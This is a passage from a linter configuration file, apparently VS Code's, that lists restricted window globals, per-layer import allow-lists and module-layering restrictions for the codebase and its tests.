					'message': 'Use <targetWindow>.cancelAnimationFrame to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'requestIdleCallback',
					'message': 'Use <targetWindow>.requestIdleCallback to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'cancelIdleCallback',
					'message': 'Use <targetWindow>.cancelIdleCallback to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'window',
					'message': 'Use <targetWindow> to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'addEventListener',
					'message': 'Use <targetWindow>.addEventListener to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'removeEventListener',
					'message': 'Use <targetWindow>.removeEventListener to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'getComputedStyle',
					'message': 'Use <targetWindow>.getComputedStyle to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'focus',
					'message': 'Use <targetWindow>.focus to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'blur',
					'message': 'Use <targetWindow>.blur to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'close',
					'message': 'Use <targetWindow>.close to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'dispatchEvent',
					'message': 'Use <targetWindow>.dispatchEvent to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'getSelection',
					'message': 'Use <targetWindow>.getSelection to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'matchMedia',
					'message': 'Use <targetWindow>.matchMedia to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'open',
					'message': 'Use <targetWindow>.open to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'parent',
					'message': 'Use <targetWindow>.parent to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'postMessage',
					'message': 'Use <targetWindow>.postMessage to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'devicePixelRatio',
					'message': 'Use <targetWindow>.devicePixelRatio to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'frames',
					'message': 'Use <targetWindow>.frames to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'frameElement',
					'message': 'Use <targetWindow>.frameElement to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'innerHeight',
					'message': 'Use <targetWindow>.innerHeight to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'innerWidth',
					'message': 'Use <targetWindow>.innerWidth to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'outerHeight',
					'message': 'Use <targetWindow>.outerHeight to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'outerWidth',
					'message': 'Use <targetWindow>.outerWidth to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'opener',
					'message': 'Use <targetWindow>.opener to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'origin',
					'message': 'Use <targetWindow>.origin to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'screen',
					'message': 'Use <targetWindow>.screen to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'screenLeft',
					'message': 'Use <targetWindow>.screenLeft to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'screenTop',
					'message': 'Use <targetWindow>.screenTop to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'screenX',
					'message': 'Use <targetWindow>.screenX to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'screenY',
					'message': 'Use <targetWindow>.screenY to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'scrollX',
					'message': 'Use <targetWindow>.scrollX to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'scrollY',
					'message': 'Use <targetWindow>.scrollY to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'top',
					'message': 'Use <targetWindow>.top to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'visualViewport',
					'message': 'Use <targetWindow>.visualViewport to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				}
			]
		}
	},
	// electron-utility layer
	{
		files: [
			'src/**/electron-utility/**/*.ts'
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		rules: {
			'no-restricted-imports': [
				'warn',
				{
					'paths': [
						{
							'name': 'electron',
							'allowImportNames': [
								'net',
								'system-preferences',
							],
							'message': 'Only net and system-preferences are allowed to be imported from electron'
						}
					]
				}
			]
		}
	},
	{
		files: [
			'src/**/*.ts'
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'local': pluginLocal,
		},
		rules: {
			'no-restricted-imports': [
				'warn',
				{
					'patterns': [
						{
							'group': ['dompurify*'],
							'message': 'Use domSanitize instead of dompurify directly'
						},
					]
				}
			],
			'local/code-import-patterns': [
				'warn',
				{
					// imports that are allowed in all files of layers:
					// - browser
					// - electron-browser
					'when': 'hasBrowser',
					'allow': []
				},
				{
					// imports that are allowed in all files of layers:
					// - node
					// - electron-utility
					// - electron-main
					'when': 'hasNode',
					'allow': [
						'@github/copilot-sdk',
						'zod',
						'@microsoft/dev-tunnels-contracts',
						'@microsoft/dev-tunnels-management',
						'@parcel/watcher',
						'@vscode/sqlite3',
						'@vscode/vscode-languagedetection',
						'@vscode/ripgrep-universal',
						'@vscode/iconv-lite-umd',
						'@vscode/native-watchdog',
						'@vscode/policy-watcher',
						'@vscode/proxy-agent',
						'@vscode/spdlog',
						'@vscode/windows-process-tree',
						'assert',
						'child_process',
						'console',
						'cookie',
						'crypto',
						'detect-libc',
						'dns',
						'events',
						'fs',
						'fs/promises',
						'http',
						'https',
						'inspector',
						'minimist',
						'node:module',
						'node:url',
						'node:v8',
						'native-keymap',
						'net',
						'node-pty',
						'os',
						// 'path', NOT allowed: use src/vs/base/common/path.ts instead
						'perf_hooks',
						'readline',
						'ssh2',
						'stream',
						'string_decoder',
						'tar',
						'tas-client',
						'tls',
						'undici',
						'undici-types',
						'url',
						'module',
						'util',
						'vscode-regexpp',
						'vscode-textmate',
						'worker_threads',
						'ws',
						'@xterm/addon-clipboard',
						'@xterm/addon-image',
						'@xterm/addon-ligatures',
						'@xterm/addon-search',
						'@xterm/addon-serialize',
						'@xterm/addon-unicode11',
						'@xterm/addon-webgl',
						'@xterm/headless',
						'@xterm/xterm',
						'yauzl',
						'yazl',
						'zlib',
						'chrome-remote-interface'
					]
				},
				{
					// imports that are allowed in all files of layers:
					// - electron-utility
					// - electron-main
					'when': 'hasElectron',
					'allow': [
						'electron'
					]
				},
				{
					// imports that are allowed in all /test/ files
					'when': 'test',
					'allow': [
						'assert',
						'sinon',
						'sinon-test'
					]
				},
				// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
				// !!! Do not relax these rules !!!
				// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
				//
				// A path ending in /~ has a special meaning. It indicates a template position
				// which will be substituted with one or more layers.
				//
				// When /~ is used in the target, the rule will be expanded to 14 distinct rules.
				// e.g. 'src/vs/base/~' will be expanded to:
				//  - src/vs/base/common
				//  - src/vs/base/worker
				//  - src/vs/base/browser
				//  - src/vs/base/electron-browser
				//  - src/vs/base/node
				//  - src/vs/base/electron-main
				//  - src/vs/base/test/common
				//  - src/vs/base/test/worker
				//  - src/vs/base/test/browser
				//  - src/vs/base/test/electron-browser
				//  - src/vs/base/test/node
				//  - src/vs/base/test/electron-main
				//
				// When /~ is used in the restrictions, it will be replaced with the correct
				// layers that can be used e.g. 'src/vs/base/electron-browser' will be able
				// to import '{common,browser,electron-sanbox}', etc.
				//
				// It is possible to use /~ in the restrictions property even without using it in
				// the target property by adding a layer property.
				{
					'target': 'src/vs/base/~',
					'restrictions': [
						'vs/base/~'
					]
				},
				{
					'target': 'src/vs/base/parts/*/~',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~'
					]
				},
				{
					'target': 'src/vs/platform/agentHost/node/diffWorkerMain.ts',
					'layer': 'node',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/common/diff/**', // diffing logic used by the agent host
					]
				},
				{
					'target': 'src/vs/platform/agentHost/~',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'tas-client', // node module allowed even in /common/
						'@microsoft/1ds-core-js', // node module allowed even in /common/
						'@microsoft/1ds-post-js', // node module allowed even in /common/
						'@xterm/headless', // node module allowed even in /common/
						'@vscode/fs-copyfile', // used by agentHost for file copying after worktree creation
						'@vscode/tree-sitter-wasm', // used by agentHost for command auto-approval
						'@vscode/copilot-api', // used by agentHost for Copilot API requests
						'@anthropic-ai/sdk', // used by agentHost for Anthropic API requests
						'@anthropic-ai/claude-agent-sdk', // used by agentHost for Claude Agent SDK session enumeration / queries
						'@modelcontextprotocol/sdk/**/*', // used by agentHost for Claude client-tool MCP result types (Phase 10)
						'@github/copilot-sdk',
						'zod', // used by agentHost for Claude client-tool MCP input schemas
						{ 'when': 'hasNode', 'pattern': 'libsodium-wrappers' },
						{ 'when': 'hasNode', 'pattern': '@hpke/core' },
						{
							'when': 'test',
							'pattern': 'events'
						},
						{
							'when': 'test',
							'pattern': 'module'
						},
						{
							'when': 'test',
							'pattern': 'websocket'
						}
					]
				},
				{
					'target': 'src/vs/platform/*/~',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'tas-client', // node module allowed even in /common/
						'@microsoft/1ds-core-js', // node module allowed even in /common/
						'@microsoft/1ds-post-js', // node module allowed even in /common/
						'@xterm/headless', // node module allowed even in /common/
						'@vscode/tree-sitter-wasm' // used by agentHost for command auto-approval
					]
				},
				{
					'target': 'src/vs/editor/~',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~',
						'@vscode/tree-sitter-wasm', // node module allowed even in /common/
						'@vscode/diff' // type import (loaded at runtime via resolveAmdNodeModulePath)
					]
				},
				{
					'target': 'src/vs/editor/contrib/*/~',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~',
						'vs/editor/contrib/*/~'
					]
				},
				{
					'target': 'src/vs/editor/standalone/~',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~',
						'vs/editor/contrib/*/~',
						'vs/editor/standalone/~',
						'@vscode/tree-sitter-wasm' // type import
					]
				},
				{
					'target': 'src/vs/editor/editor.all.ts',
					'layer': 'browser',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~',
						'vs/editor/contrib/*/~'
					]
				},
				{
					'target': 'src/vs/editor/editor.worker.start.ts',
					'layer': 'worker',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~'
					]
				},
				{
					'target': 'src/vs/editor/{editor.api.ts,editor.main.ts}',
					'layer': 'browser',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/editor/~',
						'vs/editor/contrib/*/~',
						'vs/editor/standalone/~',
						'vs/editor/*'
					]
				},
				{
					'target': 'src/vs/workbench/~',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~',
						'vs/editor/contrib/*/~',
						'vs/workbench/~',
						'vs/workbench/services/*/~',
						'assert',
						{
							'when': 'test',
							'pattern': 'vs/workbench/contrib/*/~'
						} // TODO@layers
					]
				},
				{
					'target': 'src/vs/workbench/api/~',
					'restrictions': [
						'vscode',
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~',
						'vs/editor/contrib/*/~',
						'vs/workbench/api/~',
						'vs/workbench/~',
						'vs/workbench/services/*/~',
						'vs/workbench/contrib/*/~',
						'vs/workbench/contrib/terminalContrib/*/~'
					]
				},
				{
					'target': 'src/vs/workbench/services/*/~',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~',
						'vs/editor/contrib/*/~',
						'vs/workbench/~',
						'vs/workbench/services/*/~',
						{
							'when': 'test',
							'pattern': 'vs/workbench/contrib/*/~'
						}, // TODO@layers
						'tas-client', // node module allowed even in /common/
						'vscode-textmate', // node module allowed even in /common/
						'@vscode/vscode-languagedetection', // node module allowed even in /common/
						'@vscode/tree-sitter-wasm', // type import
						{
							'when': 'hasBrowser',
							'pattern': '@xterm/xterm'
						} // node module allowed even in /browser/
					]
				},
				{
					'target': 'src/vs/workbench/contrib/*/~',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~',
						'vs/editor/contrib/*/~',
						'vs/workbench/~',
						'vs/workbench/services/*/~',
						'vs/workbench/contrib/*/~',
						'vs/sessions/~',
						'vs/workbench/contrib/terminal/terminalContribChatExports*',
						'vs/workbench/contrib/terminal/terminalContribExports*',
						'vscode-notebook-renderer', // Type only import
						'@vscode/tree-sitter-wasm', // type import
						{
							'when': 'hasBrowser',
							'pattern': '@xterm/xterm'
						}, // node module allowed even in /browser/
						{
							'when': 'hasBrowser',
							'pattern': '@xterm/addon-*'
						}, // node module allowed even in /browser/
						{
							'when': 'hasBrowser',
							'pattern': 'vscode-textmate'
						} // node module allowed even in /browser/
					]
				},
				{
					'target': 'src/vs/workbench/contrib/terminalContrib/*/~',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~',
						'vs/editor/contrib/*/~',
						'vs/workbench/~',
						'vs/workbench/services/*/~',
						'vs/workbench/contrib/*/~',
						// Only allow terminalContrib to import from itself, this works because
						// terminalContrib is one extra folder deep
						'vs/workbench/contrib/terminalContrib/*/~',
						'vscode-notebook-renderer', // Type only import
						'@vscode/tree-sitter-wasm', // type import
						{
							'when': 'hasBrowser',
							'pattern': '@xterm/xterm'
						}, // node module allowed even in /browser/
						{
							'when': 'hasBrowser',
							'pattern': '@xterm/addon-*'
						}, // node module allowed even in /browser/
						{
							'when': 'hasBrowser',
							'pattern': 'vscode-textmate'
						}, // node module allowed even in /browser/
						'@xterm/headless' // node module allowed even in /common/ and /browser/
					]
				},
				{
					'target': 'src/vs/code/~',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~',
						'vs/editor/contrib/*/~',
						'vs/code/~',
						{
							'when': 'hasBrowser',
							'pattern': 'vs/workbench/workbench.web.main.js'
						},
						{
							'when': 'hasBrowser',
							'pattern': 'vs/workbench/workbench.web.main.internal.js'
						},
						{
							'when': 'hasBrowser',
							'pattern': 'vs/workbench/~'
						},
						{
							'when': 'hasBrowser',
							'pattern': 'vs/workbench/services/*/~'
						}
					]
				},
				{
					'target': 'src/vs/sessions/electron-browser/sessions.ts',
					'layer': 'electron-browser',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/sessions/~',
						'vs/sessions/sessions.desktop.main.js'
					]
				},
				{
					'target': 'src/vs/server/~',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/workbench/~',
						'vs/workbench/api/~',
						'vs/workbench/services/*/~',
						'vs/workbench/contrib/*/~',
						'vs/server/~'
					]
				},
				{
					'target': 'src/vs/workbench/contrib/terminal/terminal.all.ts',
					'layer': 'browser',
					'restrictions': [
						'vs/workbench/contrib/**'
					]
				},
				{
					'target': 'src/vs/workbench/contrib/terminal/terminalContribChatExports.ts',
					'layer': 'browser',
					'restrictions': [
						'vs/workbench/contrib/terminalContrib/*/~'
					]
				},
				{
					'target': 'src/vs/workbench/contrib/terminal/terminalContribExports.ts',
					'layer': 'browser',
					'restrictions': [
						'vs/platform/*/~',
						'vs/workbench/contrib/terminalContrib/*/~'
					]
				},
				{
					'target': 'src/vs/workbench/workbench.common.main.ts',
					'layer': 'browser',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~',
						'vs/editor/contrib/*/~',
						'vs/editor/editor.all.js',
						'vs/workbench/~',
						'vs/workbench/api/~',
						'vs/workbench/services/*/~',
						'vs/workbench/contrib/*/~',
						'vs/workbench/contrib/terminal/terminal.all.js',
					]
				},
				{
					'target': 'src/vs/workbench/workbench.web.main.ts',
					'layer': 'browser',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~',
						'vs/editor/contrib/*/~',
						'vs/editor/editor.all.js',
						'vs/workbench/~',
						'vs/workbench/api/~',
						'vs/workbench/services/*/~',
						'vs/workbench/contrib/*/~',
						'vs/workbench/workbench.common.main.js'
					]
				},
				{
					'target': 'src/vs/workbench/workbench.web.main.internal.ts',
					'layer': 'browser',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~',
						'vs/editor/contrib/*/~',
						'vs/editor/editor.all.js',
						'vs/workbench/~',
						'vs/workbench/api/~',
						'vs/workbench/services/*/~',
						'vs/workbench/contrib/*/~',
						'vs/workbench/workbench.web.main.js'
					]
				},
				{
					'target': 'src/vs/workbench/workbench.desktop.main.ts',
					'layer': 'electron-browser',
					'restrictions': [
						'vs/base/*/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~',
						'vs/editor/contrib/*/~',
						'vs/editor/editor.all.js',
						'vs/workbench/~',
						'vs/workbench/api/~',
						'vs/workbench/services/*/~',
						'vs/workbench/contrib/*/~',
						'vs/workbench/workbench.common.main.js'
					]
				},
				{
					'target': 'src/vs/amdX.ts',
					'restrictions': [
						'vs/base/common/*'
					]
				},
				{
					'target': 'src/vs/{monaco.d.ts,nls.ts}',
					'restrictions': []
				},
				{
					'target': 'src/vscode-dts/**',
					'restrictions': []
				},
				{
					'target': 'src/vs/nls.ts',
					'restrictions': [
						'vs/*'
					]
				},
				{
					'target': 'src/{bootstrap-cli.ts,bootstrap-esm.ts,bootstrap-fork.ts,bootstrap-import.ts,bootstrap-meta.ts,bootstrap-node.ts,bootstrap-server.ts,cli.ts,main.ts,mainImpl.ts,server-cli.ts,server-main.ts}',
					'restrictions': [
						'vs/**/common/*',
						'vs/**/node/*',
						'vs/nls.js',
						'src/*.js',
						'*' // node.js
					]
				},
				{
					'target': 'src/vs/sessions/sessions.common.main.ts',
					'layer': 'browser',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~',
						'vs/editor/contrib/*/~',
						'vs/editor/editor.all.js',
						'vs/sessions/~',
						'vs/sessions/services/*/~',
						'vs/sessions/contrib/*/~',
						'vs/sessions/contrib/providers/*/~',
						'vs/workbench/~',
						'vs/workbench/api/~',
						'vs/workbench/services/*/~',
						'vs/workbench/contrib/*/~',
						'vs/workbench/contrib/terminal/terminal.all.js',
					]
				},
				{
					'target': 'src/vs/sessions/sessions.desktop.main.ts',
					'layer': 'electron-browser',
					'restrictions': [
						'vs/base/*/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~',
						'vs/editor/contrib/*/~',
						'vs/editor/editor.all.js',
						'vs/sessions/~',
						'vs/sessions/services/*/~',
						'vs/sessions/contrib/*/~',
						'vs/sessions/contrib/providers/*/~',
						'vs/workbench/~',
						'vs/workbench/api/~',
						'vs/workbench/services/*/~',
						'vs/workbench/contrib/*/~',
						'vs/sessions/sessions.common.main.js'
					]
				},
				{
					'target': 'src/vs/sessions/sessions.web.main.ts',
					'layer': 'browser',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~',
						'vs/editor/contrib/*/~',
						'vs/editor/editor.all.js',
						'vs/sessions/~',
						'vs/sessions/services/*/~',
						'vs/sessions/contrib/*/~',
						'vs/sessions/contrib/providers/*/~',
						'vs/workbench/~',
						'vs/workbench/api/~',
						'vs/workbench/services/*/~',
						'vs/workbench/contrib/*/~',
						'vs/sessions/sessions.common.main.js'
					]
				},
				{
					'target': 'src/vs/sessions/sessions.web.main.internal.ts',
					'layer': 'browser',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/sessions/~',
						'vs/sessions/contrib/*/~',
						'vs/sessions/contrib/providers/*/~',
						'vs/workbench/~',
						'vs/workbench/browser/**',
						'vs/workbench/services/*/~',
						'vs/workbench/contrib/*/~',
						'vs/sessions/sessions.web.main.js'
					]
				},
				{
					'target': 'src/vs/sessions/test/sessions.web.test.internal.ts',
					'layer': 'browser',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/sessions/~',
						'vs/sessions/test/**',
						'vs/sessions/contrib/*/~',
						'vs/sessions/contrib/providers/*/~',
						'vs/workbench/~',
						'vs/workbench/browser/**',
						'vs/workbench/services/*/~',
						'vs/workbench/contrib/*/~',
						'vs/sessions/sessions.web.main.js'
					]
				},
				{
					'target': 'src/vs/sessions/test/{web.test.ts,web.test.factory.ts}',
					'layer': 'browser',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/sessions/~',
						'vs/sessions/test/**',
						'vs/sessions/contrib/*/~',
						'vs/workbench/~',
						'vs/workbench/browser/**',
						'vs/workbench/services/*/~',
						'vs/workbench/contrib/*/~'
					]
				},
				{
					'target': 'src/vs/sessions/~',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~',
						'vs/editor/contrib/*/~',
						'vs/workbench/~',
						'vs/workbench/browser/**',
						'vs/workbench/services/*/~',
						'vs/sessions/~',
						'vs/sessions/services/*/~'
					]
				},
				{
					'target': 'src/vs/sessions/contrib/providers/*/~',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~',
						'vs/editor/contrib/*/~',
						'vs/workbench/~',
						'vs/workbench/browser/**',
						'vs/workbench/services/*/~',
						'vs/workbench/contrib/*/~',
						'vs/sessions/~',
						'vs/sessions/contrib/*/~',
						'vs/sessions/contrib/providers/*/~',
						'vs/sessions/services/*/~',
						'@microsoft/dev-tunnels-connections', // type-only browser bundle conformance check
						'@microsoft/dev-tunnels-management', // type-only browser bundle conformance check
					]
				},
				{
					'target': 'src/vs/sessions/contrib/*/~',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~',
						'vs/editor/contrib/*/~',
						'vs/workbench/~',
						'vs/workbench/browser/**',
						'vs/workbench/services/*/~',
						'vs/workbench/contrib/*/~',
						'vs/sessions/~',
						'vs/sessions/contrib/*/~',
						'vs/sessions/services/*/~',
					]
				},
				{
					'target': 'src/vs/sessions/services/*/~',
					'restrictions': [
						'vs/base/~',
						'vs/base/parts/*/~',
						'vs/platform/*/~',
						'vs/editor/~',
						'vs/editor/contrib/*/~',
						'vs/workbench/~',
						'vs/workbench/services/*/~',
						'vs/sessions/~',
						'vs/sessions/services/*/~',
						'vs/workbench/contrib/*/~',
						{
							'when': 'test',
							'pattern': 'vs/workbench/contrib/*/~'
						}, // TODO@layers
						'tas-client', // node module allowed even in /common/
						'vscode-textmate', // node module allowed even in /common/
						'@vscode/vscode-languagedetection', // node module allowed even in /common/
						'@vscode/tree-sitter-wasm', // type import
						{
							'when': 'hasBrowser',
							'pattern': '@xterm/xterm'
						} // node module allowed even in /browser/
					]
				},
			]
		}
	},
	{
		files: [
			'test/**/*.ts'
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'local': pluginLocal,
		},
		rules: {
			'local/code-import-patterns': [
				'warn',
				{
					'target': 'test/smoke/**',
					'restrictions': [
						'test/automation',
						'test/smoke/**',
						'@vscode/*',
						'@parcel/*',
						'@playwright/*',
						'*' // node modules
					]
				},
				{
					'target': 'test/sanity/**',
					'restrictions': [
						'test/sanity/**',
						'*' // node modules
					]
				},
				{
					'target': 'test/automation/**',
					'restrictions': [
						'test/automation/**',
						'@vscode/*',
						'@parcel/*',
						'playwright-core/**',
						'@playwright/*',
						'*' // node modules
					]
				},
				{
					'target': 'test/integration/**',
					'restrictions': [
						'test/integration/**',
						'@vscode/*',
						'@parcel/*',
						'@playwright/*',
						'*' // node modules
					]
				},
				{
					'target': 'test/monaco/**',
					'restrictions': [
						'test/monaco/**',
						'@vscode/*',
						'@parcel/*',
						'@playwright/*',
						'*' // node modules
					]
				},
				{
					'target': 'test/scenario/**',
					'restrictions': [
						'test/automation',
						'test/scenario/**',
						'@vscode/*',
						'@parcel/*',
						'@playwright/*',
						'*' // node modules
					]
				},
				{
					'target': 'test/mcp/**',
					'restrictions': [
						'test/automation',
						'test/scenario',
						'test/mcp/**',
						'@vscode/*',
						'@parcel/*',
						'@playwright/*',
						'@modelcontextprotocol/sdk/**/*',
						'*' // node modules
					]
				},
				{
					'target': 'test/componentFixtures/playwright/**',
					'restrictions': [
						'test/componentFixtures/playwright/**',
						'@playwright/*',
						'*' // node modules
					]
				}
			]
		}
	},
	{
		files: ['src/vs/**/*.ts'],
		rules: {
			'local/code-no-legacy-notification-parsing': ['error', {
				allowedFiles: [
					'src/vs/workbench/api/browser/mainThreadMessageService.ts',
					'src/vs/workbench/api/browser/mainThreadProgress.ts',
					'src/vs/platform/notification/test/common/notificationMessage.test.ts',
					'src/vs/workbench/test/common/notifications.test.ts',
					'src/vs/workbench/test/browser/notificationsList.test.ts',
					'src/vs/workbench/services/progress/test/browser/progressService.test.ts',
				],
			}],
		},
	},
	{
		// `IAgentSessionsService` and the agent sessions model are provider-internal
		// to Copilot. Only the Copilot chat sessions provider may consume them; the
		// rest of the Agents window (sessions workbench) must stay provider-agnostic.
		// See src/vs/sessions/SESSIONS.md.
		files: [
			'src/vs/sessions/**/*.ts'
		],
		ignores: [
			'src/vs/sessions/contrib/providers/copilotChatSessions/**/*.ts'
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		rules: {
			'no-restricted-imports': [
				'warn',
				{
					'patterns': [
						{
							'group': ['dompurify*'],
							'message': 'Use domSanitize instead of dompurify directly'
						},
						{
							'group': ['**/agentSessions/agentSessionsService', '**/agentSessions/agentSessionsService.js'],
							'message': 'IAgentSessionsService is provider-internal to Copilot. Only contrib/providers/copilotChatSessions may import it; the rest of the Agents window must stay provider-agnostic. See src/vs/sessions/SESSIONS.md.'
						}
					]
				}
			]
		}
	},
	{
		files: [
			'src/vs/workbench/contrib/notebook/browser/view/renderers/*.ts'
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'local': pluginLocal,
		},
		rules: {
			'local/code-no-runtime-import': [
				'error',
				{
					'src/vs/workbench/contrib/notebook/browser/view/renderers/webviewPreloads.ts': [
						'**/*'
					]
				}
			],
			'local/code-limited-top-functions': [
				'error',
				{
					'src/vs/workbench/contrib/notebook/browser/view/renderers/webviewPreloads.ts': [
						'webviewPreloads',
						'preloadsScriptStr'
					]
				}
			]
		}
	},
	// Terminal
	{
